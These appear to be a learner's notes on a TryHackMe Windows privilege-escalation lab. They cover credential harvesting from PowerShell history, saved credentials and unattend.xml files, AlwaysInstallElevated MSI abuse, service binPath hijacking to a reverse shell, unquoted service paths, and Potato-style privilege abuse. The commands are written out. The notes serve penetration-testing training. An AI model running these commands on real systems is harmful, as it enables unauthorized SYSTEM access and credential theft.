
# TryHackMe: Windows Privilege Escalation
**Path:** Jr Penetration Tester -> Privilege Escalation
**Date:** 2026-04-14
**difficulty:**  Medium

---

## 1. Initial Enumeration
Before firing exploits, you must understand the environment. Your goal is to move from a standard user to `NT AUTHORITY\SYSTEM` (the Windows equivalent of Linux `root`) or an Administrator account.

| Target | Command | Purpose |
| :--- | :--- | :--- |
| **Current User** | `whoami /priv` | Shows your current user and enabled privileges. |
| **System Info** | `systeminfo` | OS version, build, and architecture (useful for finding CVEs). |
| **Network** | `netstat -ano` | Lists active network connections and listening ports. |
| **Users** | `net user` | Lists all users on the machine. |

> 💡 **Concept Check:** Windows privilege escalation largely relies on exploiting bad permissions set by administrators, vulnerable services, or leftover configuration files.

---

## 2. Harvesting Passwords from Usual Spots
Administrators often leave plaintext credentials in configuration files, registry keys, or command history.

### Powershell History
Windows keeps a record of commands typed in PowerShell, which often include passwords passed as arguments.
```powershell
# Find the path to the history file
(Get-PSReadLineOption).HistorySavePath

# Read the contents of the history file
type C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
````

### Saved Windows Credentials

Users can save credentials in the Windows Credential Manager to avoid re-typing them.

DOS

```
# List all saved credentials
cmdkey /list

# If you see an Admin credential, you can execute commands as them without the password:
runas /savecred /user:Administrator "cmd.exe /c reverse_shell.exe"
```

### Unattended Windows Installations

When deploying many Windows machines, admins use `unattend.xml` files to automate the setup, which often contain the Administrator password (sometimes base64 encoded).

DOS

```
# Common locations to check:
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\sysprep\unattend.xml
```

---

## 3. Other Quick Wins

### AlwaysInstallElevated

If this specific registry key is enabled, **any user** can install an `.msi` (Microsoft Installer) file with `NT AUTHORITY\SYSTEM` privileges.

DOS

```
# Check if the registry keys are set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both are `1`, generate a malicious `.msi` reverse shell with `msfvenom` on Kali, transfer it, and run:

DOS

```
msiexec /quiet /qn /i C:\path\to\malicious.msi
```

---

## 4. Abusing Service Misconfigurations

Windows Services run in the background, often as `SYSTEM`. If their permissions are weak, we can hijack them.

### Insecure Service Permissions (binPath Manipulation)

If your user has the `SERVICE_CHANGE_CONFIG` permission on a service, you can change the executable it runs.

DOS

```
# Check permissions with AccessChk (Sysinternals tool)
accesschk64.exe -uwcqv <YourUser> <ServiceName>

# Change the binpath to a reverse shell
sc config <ServiceName> binpath= "\"C:\path\to\reverse_shell.exe\""

# Restart the service to trigger the shell
net stop <ServiceName>
net start <ServiceName>
```

### Unquoted Service Paths

If a service's executable path contains spaces and is **not** enclosed in quotes, Windows will look for an executable at every space.

- _Path:_ `C:\Program Files\My App\service.exe`
    
- _Windows checks:_ `C:\Program.exe` ➔ `C:\Program Files\My.exe` ➔ `C:\Program Files\My App\service.exe`
    
    If you have write access to `C:\`, you can drop a malicious payload named `Program.exe`, restart the service, and Windows will execute your malware as `SYSTEM`.
    

### Insecure Service Executables

If the service path is quoted, but you have write access to the actual `.exe` file itself, simply replace the legitimate executable with your reverse shell and restart the service.

---

## 5. Abusing Dangerous Privileges

Check your privileges with `whoami /priv`. If you see any of the following, the system is highly vulnerable.

|**Privilege**|**Exploitation Strategy**|
|---|---|
|**SeBackupPrivilege**|Allows you to bypass file read permissions. Use it to copy the `SAM` and `SYSTEM` registry hives to extract NTLM hashes offline (like in the previous Capstone).|
|**SeRestorePrivilege**|Allows you to bypass file write permissions. Can be used to overwrite system binaries or inject DLLs into high-privileged processes.|
|**SeTakeOwnershipPrivilege**|Allows you to take ownership of any file, enabling you to change its permissions and overwrite it.|
|**SeImpersonatePrivilege**|**Extremely Dangerous.** Allows you to force a SYSTEM process to authenticate to you. Exploited using tools like **PrintSpoofer**, **RoguePotato**, or **JuicyPotato**.|

---

## 6. Tools of the Trade (Automated Enumeration)

Manual enumeration on Windows is tedious. Use these industry-standard tools to find the misconfigurations instantly.

**WinPEAS (Windows Privilege Escalation Awesome Scripts)**

The Windows equivalent of LinPEAS. It color-codes vulnerabilities.

DOS

```
# Run from a command prompt
winPEASany.exe
```

**PowerUp**

A PowerShell module that specifically looks for privilege escalation vectors and often provides the exact command to exploit them.

PowerShell

```
# Bypass execution policy, load the script, and run all checks
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

**AccessChk (Sysinternals)**

A Microsoft-signed binary used to check exact read/write permissions on files, registry keys, and services.

DOS

```
accesschk64.exe -uwdq C:\Target\Folder
```